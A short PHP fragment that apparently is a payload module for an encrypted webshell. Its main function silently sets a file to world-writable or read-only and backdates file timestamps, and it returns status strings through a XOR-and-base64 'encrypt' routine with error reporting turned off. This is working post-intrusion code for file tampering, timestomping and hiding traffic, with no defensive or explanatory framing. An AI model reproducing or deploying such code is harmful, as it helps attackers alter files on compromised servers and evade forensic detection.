error_reporting(0);


function main($path,$attr,$time)
{
	$res=false;
	switch($attr){
		case "read":
		$res=@chmod($path,0555);
		break;
		case "write":
		$res=@chmod($path,0777);
		break;
		case "time":
		$res=touch($path,$time/1000);
		break;
		
	}
	if($res){
		echo "Success";
	}
	else{
		echo "Failed";
	}
}
function encrypt($data,$key)
{
	for($i=0;$i<strlen($data);$i++) {
    	$data[$i] = $data[$i]^$key[$i+5&15]; 
    }
	return base64_encode($data);
}